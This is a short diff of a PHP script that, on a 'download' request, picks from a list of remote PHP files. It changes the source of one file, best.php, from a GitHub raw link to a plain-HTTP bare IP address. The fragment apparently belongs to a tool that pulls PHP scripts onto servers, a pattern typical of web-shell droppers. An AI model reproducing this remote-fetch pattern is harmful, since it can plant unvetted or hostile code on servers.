@@ -116,7 +116,7 @@ if (isset($_GET['download']) && isset($_GET['file'])) {
     
     $files = [
         'best' => [
-            'url' => 'https://raw.githubusercontent.com/jmusaisa002-eng/bp/refs/heads/main/best.php',
+            'url' => 'http://43.156.137.115/latest/raw/best.php',
             'name' => 'best.php'
         ],
         'txets' => [
